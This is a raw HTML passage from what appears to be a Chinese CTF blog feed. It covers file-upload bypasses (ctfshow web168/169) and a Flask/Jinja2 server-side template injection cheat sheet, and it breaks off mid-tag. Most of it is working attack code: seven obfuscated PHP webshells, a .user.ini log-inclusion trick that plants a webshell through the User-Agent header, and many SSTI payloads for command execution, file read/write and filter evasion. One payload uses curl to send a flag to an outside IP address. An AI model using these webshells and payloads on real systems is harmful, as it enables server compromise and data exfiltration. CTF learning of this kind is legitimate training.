class="line">31</span><br></pre></td><td class="code"><pre><span class="line">脚本<span class="number">1</span>:</span><br><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span>    <span class="comment">//利用反引号执行系统命令</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">2</span>:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//a=system&amp;b=tac ../flagaa.php</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">3</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);    <span class="comment">//拼接</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">4</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">5</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>; <span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span> <span class="comment">//替换</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">6</span>:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>); <span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">脚本<span class="number">7</span>:</span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;);</span><br><span class="line"><span class="comment">#数字函数  get传参   abs=system&amp;acos=tac ../flagaa.php</span></span><br></pre></td></tr></table></figure><p>上传上面任意脚本，修改后缀，可以看到成功上传</p><p><img src="https://i0.hdslb.com/bfs/album/7d29e3294368dc894b95ca923e4783b9e3f4399c.png" alt="image-20211029170923801"></p><p>蚁剑连接即可</p><h5 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h5><h6 id="user-ini-进行日志包含"><a href="#user-ini-进行日志包含" class="headerlink" title=".user.ini 进行日志包含"></a>.user.ini 进行日志包含</h6><p><img src="https://i0.hdslb.com/bfs/album/b45dfd382282b37de08a5c3f033f3de6da195c4e.png" alt="image-20211029173812485"></p><p>需要上传zip文件，但zip的文件上传不上</p><p><img src="https://i0.hdslb.com/bfs/album/c47858e1f782acb679156b2c18faef790c80d475.png" alt="image-20211029173918106"></p><p>后端检查了MIME,只能为image&#x2F;png</p><p><img src="https://i0.hdslb.com/bfs/album/26bd57c8d5d17b299a0463b486fe15c87e27d604.png" alt="image-20211029174714168"></p><p>所以抓包需要修改MIME type为image&#x2F;png！！！！！！&#x2F;&#x2F;注意改</p><p>发现可以成功上传</p><p><img src="https://i0.hdslb.com/bfs/album/9fb2af2a038f6af381fd2c5e9b7f54bc9fb40bf8.png" alt="image-20211029174845438"></p><p>尝试之后发现也对文件内容进行了过滤：&lt;&gt;?空格$等等</p><p><img src="https://i0.hdslb.com/bfs/album/54a7a39608c084b0df230323ef1b7abeb634b185.png" alt="image-20211029175027359"></p><p>但文件名可以修改为.user.ini和php</p><p>因为过滤，一句话上传不了，所以可以用 .user.ini 进行日志包含，即在UA头写入一句话</p><p>姿势： 先上传.user.ini文件，内容为 <strong>auto_append_file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=/var/log/nginx/access.log</span><br><span class="line">这里是利用nginx日志路径包含</span><br><span class="line">这样就可以往UA里写入一句话了</span><br><span class="line">image/png</span><br></pre></td></tr></table></figure><p><img src="https://i0.hdslb.com/bfs/album/1e6ee432aa340c42e92de909d04dd194125a0988.png" alt="image-20211029200541410"></p><p>然后上传一个php文件</p><p><img src="https://i0.hdslb.com/bfs/album/35a958a830f0f895d722bcb531db35d232c9d132.png" alt="image-20211029212922738"></p><p>蚁剑连接即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i0.hdslb.com/bfs/album/851edba133d86315d1459fa33f7eaa21de436b58.png&quot; alt=&quot;a2905b34fc76e7d68c4c04e63899cef9.png&quot;&gt;&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="CTF" scheme="https://micgo.top/categories/CTF/"/>
    
    
    <category term="文件上传" scheme="https://micgo.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>服务端模板注入(SSTI)</title>
    <link href="https://micgo.top/CTF/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB(SSTI)/"/>
    <id>https://micgo.top/CTF/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB(SSTI)/</id>
    <published>2022-05-25T16:00:00.000Z</published>
    <updated>2023-03-16T04:01:05.029Z</updated>
    
    <content type="html"><![CDATA[<img src="https://i0.hdslb.com/bfs/album/8800d2bb3dd5f2045d106a562bb39fc8f047275f.jpg" alt="服务端模板注入攻击" style="zoom:67%;" /><h4 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a><strong>魔术函数</strong></h4><p>这里介绍几个常见的魔术函数，有助于后续的理解</p><ul><li><p><code>__dict__</code></p><p>类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里的对象的__dict__中存储了一些self.xxx的一些东西内置的数据类型没有__dict__属性每个类有自己的__dict__属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__对象也有自己的__dict__属性， 存储self.xxx 信息，父子类对象公用__dict__</p></li><li><p><code>__globals__</code></p><p>该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用<strong>globals</strong>属性访问全局的变量。该属性保存的是函数全局变量的<strong>字典</strong>引用。</p></li><li><p><code>__getattribute__()</code></p><p>实例、类、函数都具有的<code>__getattribute__</code>魔术方法。事实上，在实例化的对象进行<code>.</code>操作的时候（形如：<code>a.xxx/a.xxx()</code>），都会自动去调用<code>__getattribute__</code>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure></li></ul><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a><strong>利用方法</strong></h4><p>根据上面提到的类继承的知识，我们可以总结出一个利用方式（这也是python沙盒溢出的关键）：从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量 这个流程中，找到我们想要的模块或者函数。</p><h4 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=<span class="string">&quot;test&quot;</span> %&#125;&#123;&#123;a&#125;&#125;      //设置变量</span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;t &#x27;</span>,<span class="string">&#x27;e &#x27;</span>,<span class="string">&#x27;s &#x27;</span>,<span class="string">&#x27;t &#x27;</span>] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125;  //执行循环</span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">25</span>==<span class="number">5</span>*<span class="number">5</span> %&#125;&#123;&#123;<span class="string">&quot;success&quot;</span>&#125;&#125;&#123;% endif %&#125;  //条件执行</span><br><span class="line"></span><br><span class="line">url_for  //可以直接和__globals__配合，如：url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]，或者和string等配合，详情看迭代器部分</span><br><span class="line">lipsum  //flask的一个方法,可以直接和__globals__配合，如：lipsum.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]，或者和string等配合，详情看迭代器部分</span><br><span class="line">get_flashed_messages // flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app</span><br><span class="line">__dic__     // 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">current_app //应用上下文，一个全局变量</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，此外，同样可以获取</span><br><span class="line"><span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1    get传参</span><br><span class="line">request.values.x1  所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1    post传参 (Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data   post传参 (Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json post传json(Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样</span><br><span class="line">&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].<span class="title function_ invoke__">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123; [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">40</span>](<span class="string">&#x27;xxx&#x27;</span>).<span class="title function_ invoke__">read</span>() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">listdir</span>(<span class="string">&#x27;.&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;命令行语句&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">40</span>](<span class="string">&#x27;xxx&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;  </span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls /&#x27;</span>).<span class="title function_ invoke__">read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">怎么拼接都可以</span><br><span class="line">&#123;&#123;config[<span class="string">&#x27;__cl&#x27;</span>+<span class="string">&#x27;ass__&#x27;</span>][<span class="string">&#x27;__in&#x27;</span>+<span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;e&#x27;</span>+<span class="string">&#x27;val&#x27;</span>](<span class="string">&quot;__im&quot;</span>+<span class="string">&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>() %&#125; &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125; &#123;% <span class="keyword">for</span> b in c.__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>].<span class="title function_ invoke__">values</span>() %&#125; &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.<span class="title function_ invoke__">keys</span>() %&#125; &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>) &#125;&#125; &#123;% <span class="keyword">endif</span> %&#125; &#123;% <span class="keyword">endif</span> %&#125; &#123;% <span class="keyword">endfor</span> %&#125; &#123;% <span class="keyword">endif</span> %&#125; &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;x.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="keyword">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">读取文件类，&lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt; file位置一般为<span class="number">40</span>，直接调用</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;fl4g&#x27;</span>).read()</span><br><span class="line">&lt;<span class="keyword">class</span> ‘site._Printer’&gt; 调用os的popen执行命令</span><br><span class="line"></span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat /&#x27;</span>).read()&#125;&#125;</span><br><span class="line">如果system被过滤，用os的listdir读取目录+file模块读取文件：</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].listdir(<span class="string">&#x27;.&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;subprocess.Popen&#x27;</span>&gt; 位置一般为<span class="number">258</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls /&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;cat /&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line">一般位置为<span class="number">59</span>，可以用它来调用file、os、<span class="built_in">eval</span>、commands等</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用file</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()      <span class="comment">#把 read() 改为 write() 就是写文件</span></span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用eval</span></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__[<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="comment">#调用system方法</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="number">12</span>].__dict__.values()[<span class="number">144</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="comment">#调用commands进行命令执行</span></span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?name=&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac ../flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>Jan’s payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir&#x27;).read()&#125;&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;jacko_god.__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;jacko|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl 175.24.73.30:2333?flag=`cat /f1agggghere`&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">也就是</span><br><span class="line">jacko.__init__.__globals__.__getitem__[&quot;__builtins__&quot;].__getitem__[&quot;eval&quot;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl 175.24.73.30:2333?flag=`cat /f1agggghere`&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__getitem__[&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;这里填写eval函数的内容，然后用unicode编码一下就行&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__getitem__[&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;][&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;][&#x27;\u0065\u0076\u0061\u006c&#x27;](&#x27;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">过滤了&#123;&#123; . [ _ \x request print string这些</span><br><span class="line">&#123;&#123; 用&#123;%%&#125;代替</span><br><span class="line">.  用attr()代替</span><br><span class="line">[  用getitem()代替</span><br><span class="line">\x 用Unicode代替</span><br><span class="line">print，request，string  不用管用不到，直接执行命令就行</span><br></pre></td></tr></table></figure><p><strong>payload框架</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>使用这个框架可以不用回显就能拿到命令执行的eval方法</strong></p><p><strong>具体payload如下</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 